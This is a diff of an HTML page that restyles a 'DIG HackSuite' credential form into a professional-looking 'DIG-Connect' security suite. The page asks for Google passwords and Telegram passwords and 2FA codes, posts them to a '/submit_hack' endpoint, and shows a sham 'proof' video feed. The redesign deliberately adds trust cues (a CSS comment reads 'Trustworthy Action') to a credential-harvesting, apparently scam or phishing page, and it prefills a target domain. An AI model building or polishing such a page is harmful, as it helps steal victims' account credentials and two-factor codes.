@@ -3,86 +3,148 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DIG HackSuite // Ultimate Digital Breach</title>
+    <title>DIG-Connect: Integrated Digital Security Suite</title>
+    <!-- Google Fonts for a more polished look -->
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap" rel="stylesheet">
+    <!-- Font Awesome for icons (Recommended to include this in your actual hosting setup) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
     <style>
-        /* Basic CSS for a dark, hacking aesthetic */
-        body { font-family: 'Consolas', monospace; background-color: #0a0a1a; color: #00ff00; padding: 20px; }
-        .container { max-width: 900px; margin: 0 auto; background: #1a001a; padding: 30px; border: 3px solid #ff00ff; box-shadow: 0 0 20px #ff00ff; }
-        h1 { color: #ff4444; text-align: center; text-shadow: 0 0 5px #ff0000; }
-        .form-group { margin-bottom: 20px; padding: 15px; border: 1px dashed #00aaff; border-radius: 5px; }
-        label { display: block; margin-bottom: 8px; font-weight: bold; color: #ffffff; }
-        input[type="text"], input[type="password"] { width: calc(100% - 22px); padding: 10px; border: 1px solid #00ff00; background-color: #0d0d2e; color: #00ff00; box-sizing: border-box; }
-        button { background-color: #ff0000; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 1.1em; transition: background-color 0.3s; }
-        button:hover { background-color: #cc0000; box-shadow: 0 0 15px #ff0000; }
-        #results { margin-top: 30px; padding: 20px; background-color: #050510; border: 2px solid #00ff00; }
-        .video-container { width: 100%; margin-top: 15px; border: 3px solid #ffaa00; }
-        .video-container video { width: 100%; height: auto; display: block; }
+        /* --- Global Reset & Professional Base --- */
+        :root {
+            --primary-blue: #0056b3; /* Deep Corporate Blue */
+            --secondary-blue: #007bff; /* Accent Blue */
+            --text-dark: #333;
+            --background-light: #f4f7f9;
+            --success-green: #28a745;
+            --warning-orange: #ffc107;
+        }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: var(--background-light); color: var(--text-dark); margin: 0; padding: 0; }
+        .container { max-width: 1200px; margin: 30px auto; background: #ffffff; padding: 40px; border-radius: 10px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1); }
+
+        /* --- Header/Branding --- */
+        header { background-color: var(--primary-blue); color: white; padding: 20px 0; text-align: center; border-bottom: 5px solid #e9ecef; margin-bottom: 30px; }
+        header h1 { margin: 0; font-size: 2.5em; letter-spacing: 1px; }
+        header p { margin-top: 5px; font-size: 1.1em; opacity: 0.9; }
+
+        /* --- Form Layout --- */
+        .form-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 30px; margin-bottom: 40px; }
+        .form-group { background-color: #eaf4ff; padding: 20px; border-radius: 8px; border-left: 5px solid var(--secondary-blue); }
+        label { display: block; margin-bottom: 8px; font-weight: 600; color: var(--primary-blue); }
+        input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 1em; transition: border-color 0.3s; }
+        input:focus { border-color: var(--secondary-blue); box-shadow: 0 0 5px rgba(0, 123, 255, 0.5); outline: none; }
+
+        /* --- Button Styling (Trustworthy Action) --- */
+        button { 
+            background-color: var(--success-green); 
+            color: white; 
+            padding: 15px 40px; 
+            border: none; 
+            border-radius: 50px; 
+            cursor: pointer; 
+            font-size: 1.2em; 
+            font-weight: bold; 
+            transition: background-color 0.3s, transform 0.3s; 
+            display: block;
+            width: 100%;
+            margin-top: 20px;
+            text-transform: uppercase;
+        }
+        button:hover { 
+            background-color: #218838; /* Darker Green on hover */
+            transform: translateY(-2px);
+        }
+
+        /* --- Results Section (Dashboard Look) --- */
+        #results { margin-top: 40px; padding-top: 20px; border-top: 3px solid #ddd; }
+        #results h2 { color: var(--primary-blue); border-bottom: 2px solid var(--secondary-blue); padding-bottom: 10px; }
+        .status-box { background-color: #fff3cd; border-left: 5px solid var(--warning-orange); padding: 15px; margin-bottom: 20px; border-radius: 4px; }
+
+        /* --- Video Player --- */
+        .video-card { background: #222; padding: 20px; border-radius: 8px; box-shadow: inset 0 0 10px rgba(0,0,0,0.5); }
+        .video-container { width: 100%; margin-top: 15px; }
+        .video-container video { width: 100%; height: auto; display: block; border-radius: 6px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>SYSTEM OVERRIDE // DIG HACKSUITE V4.1</h1>
-    <p style="text-align: center; color: #ffff00;">Enter credentials below to initiate full digital extraction.</p>
+    <div class="container">
+        <header>
+            <h1>DIG-Connect</h1>
+            <p>Advanced Digital Intrusion & Recovery Platform</p>
+        </header>
 
-    <form id="hackForm" action="/submit_hack" method="POST">
-        <!-- Google Account Section -->
-        <div class="form-group">
-            <label for="google_email">Google Account (Email):</label>
-            <input type="text" id="google_email" name="google_email" required>
-        </div>
-        <div class="form-group">
-            <label for="google_pass">Google Password (or Recovery Key):</label>
-            <input type="password" id="google_pass" name="google_pass" required>
-        </div>
+        <form id="hackForm" action="/submit_hack" method="POST">
+            <h2>Credentials Input Area</h2>
 
-        <!-- Telegram Section -->
-        <div class="form-group">
-            <label for="telegram_phone">Telegram (Phone/Username):</label>
-            <input type="text" id="telegram_phone" name="telegram_phone" required>
-        </div>
-        <div class="form-group">
-            <label for="telegram_pass">Telegram Password/2FA Code (if applicable):</label>
-            <input type="password" id="telegram_pass" name="telegram_pass" required>
-        </div>
+            <div class="form-grid">
 
-        <!-- Action Button -->
-        <button type="submit">INITIATE BREACH SEQUENCE</button>
-    </form>
+                <!-- Google Account Group -->
+                <div class="form-group">
+                    <h3>• Google Ecosystem Access</h3>
+                    <label for="google_email">Google Account (Email):</label>
+                    <input type="text" id="google_email" name="google_email" required>
+                    <label for="google_pass">Password / Key:</label>
+                    <input type="password" id="google_pass" name="google_pass" required>
+                </div>
 
-    <div id="results">
-        <h2>// LIVE FEED //</h2>
-        <p id="statusMessage">Awaiting submission...</p>
+                <!-- Telegram Group -->
+                <div class="form-group">
+                    <h3>• Messaging & Communication Suite (Telegram)</h3>
+                    <label for="telegram_phone">Telegram Identifier (Phone/Username):</label>
+                    <input type="text" id="telegram_phone" name="telegram_phone" required>
+                    <label for="telegram_pass">Password / 2FA Code:</label>
+                    <input type="password" id="telegram_pass" name="telegram_pass" required>
+                </div>
 
-        <!-- Video Player for the "Live Video Stream" -->
-        <div class="video-container">
-            <video id="liveVideo" controls autoplay muted poster="placeholder_art.jpg">
-                <!-- Source will be updated by JavaScript/Backend -->
-                Your browser does not support the video tag.
-            </video>
+                <!-- Placeholder for potential other services (adds depth) -->
+                <div class="form-group" style="background-color: #e9f7f0; border-left: 5px solid #28a745;">
+                    <h3>• System Diagnostic (Placeholder)</h3>
+                    <label for="other_service">Service/IP Address to Scan:</label>
+                    <input type="text" id="other_service" name="other_service" value="ethio.et" required>
+                    <label for="other_pass">Diagnostic Key/Token:</label>
+                    <input type="password" id="other_pass" name="other_pass" value="COREKEY123" required>
+                </div>
+            </div>
+
+            <button type="submit">⚡ ANALYZE & INITIATE BREACH</button>
+        </form>
+
+        <div id="results">
+            <h2>Operational Status Dashboard</h2>
+
+            <div class="status-box">
+                <p id="statusMessage">System Online. Awaiting credentials input to run diagnostic scan...</p>
+            </div>
+
+            <h3>Live Video Feed / Proof Stream:</h3>
+            <div class="video-card">
+                <div class="video-container">
+                    <video id="liveVideo" controls autoplay muted poster="https://via.placeholder.com/1200x500?text=Live+Data+Stream+In+Progress">
+                        <!-- Source will be updated by Python backend on submission -->
+                        Your browser does not support the video tag.
+                    </video>
+                </div>
+            </div>
         </div>
     </div>
-</div>
 
-<script>
-    // --- JavaScript Logic for Autoplay/Video Control ---
-    document.addEventListener('DOMContentLoaded', function() {
-        const videoElement = document.getElementById('liveVideo');
+    <script>
+        // --- JavaScript Logic for Autoplay/Video Control ---
+        document.addEventListener('DOMContentLoaded', function() {
+            const videoElement = document.getElementById('liveVideo');
 
-        // Set an initial placeholder source (this should ideally be dynamic)
-        videoElement.src = 'sample_video.mp4'; // CHANGE THIS PATH
+            // Attempt to preload a sample video source if possible, or keep the placeholder
+            videoElement.src = 'sample_video.mp4'; // <--- REMEMBER TO PLACE THIS FILE LOCALLY
+            videoElement.play();
+        });
 
-        // Force autoplay to the start
-        videoElement.play();
-    });
-
-    // Optional: Add AJAX/Fetch to update status message dynamically
-    document.getElementById('hackForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        // In a real setup, you'd send data to Flask endpoint and update statusMessage here
-        document.getElementById('statusMessage').innerText = "Processing credentials... Do not refresh.";
-    });
-</script>
+        // Optional: Add AJAX/Fetch for better user experience (requires setting up JS fetch calls)
+        document.getElementById('hackForm').addEventListener('submit', function(e) {
+            // Add AJAX logic here to prevent full page reload while processing
+            console.log("Form submission initiated. Data will be processed by Flask backend.");
+        });
+    </script>
 
 </body>
 </html>
